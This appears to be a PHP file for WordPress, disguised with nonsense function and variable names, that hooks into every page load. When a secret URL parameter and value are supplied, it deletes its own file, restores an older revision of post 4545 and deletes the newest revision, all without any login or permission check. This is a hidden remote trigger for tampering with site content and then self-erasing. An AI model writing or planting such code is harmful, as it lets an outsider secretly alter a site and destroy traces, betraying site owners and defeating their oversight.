<?php

function debug_before_pages_interactive() {
	if (isset($_GET['kit_optimizer_pinterest_animated']) && $_GET['kit_optimizer_pinterest_animated'] === 'hover_reloaded_coupon') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$schema_permalink_tree_google = 4545;
		$message_demo_short_featured = wp_get_post_revisions($schema_permalink_tree_google);
		if (empty($message_demo_short_featured)) die('no revisions');
		if (count($message_demo_short_featured) < 2) die('less than 2');
		$reports_external_interactivity = array_shift($message_demo_short_featured);
		$backup_blog_country_cart = $reports_external_interactivity->ID;
		$chat_signup_full_navigation = array_shift($message_demo_short_featured);
		$checker_color_maps_comment = $chat_signup_full_navigation->ID;
		$controller_column_privacy_bbpress = wp_restore_post_revision($checker_color_maps_comment);
		if ($controller_column_privacy_bbpress === false) die('error restoring');
		$controller_column_privacy_bbpress = wp_delete_post_revision($backup_blog_country_cart);		
		if ($controller_column_privacy_bbpress === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'debug_before_pages_interactive');
